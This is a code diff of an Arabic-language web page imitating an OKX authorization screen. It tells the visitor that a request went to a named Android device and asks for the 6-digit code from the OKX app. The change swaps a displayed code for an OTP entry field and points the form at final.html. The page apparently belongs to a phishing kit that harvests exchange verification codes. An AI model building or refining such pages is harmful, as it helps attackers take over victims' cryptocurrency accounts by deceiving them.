@@ -22,12 +22,14 @@
   <h2>كود التحويل</h2>
         <p class="info-text">تم إرسال طلب تفويض إلى Infinix X6833B(Android).<br>افتح تطبيق OKX على هذا الجهاز وأدخل الرمز المكوّن من 6 أرقام للمتابعة.</p>
         
-<div class="otp-display">237739</div>
-        
+<div class="otp-input-container" style="margin: 20px 0;">
+    <input type="text" name="otp" class="form-control" placeholder="أدخل رمز التحقق" 
+           style="text-align: center; font-size: 24px; letter-spacing: 10px; border-radius: 12px; padding: 15px; border: 1px solid #ddd; width: 100%;" 
+           maxlength="6" required>
+</div>        
   <a href="#" class="resend">ألم تستلم طلباً؟ <span style="text-decoration: underline;">أعد إرسال الكود (53)</span></a>
 
-<form action="/final" method="get">
-            <button type="submit" class="btn-black">تم</button>
+<form action="final.html">            <button type="submit" class="btn-black">تم</button>
         </form>
     </div>
 </body>
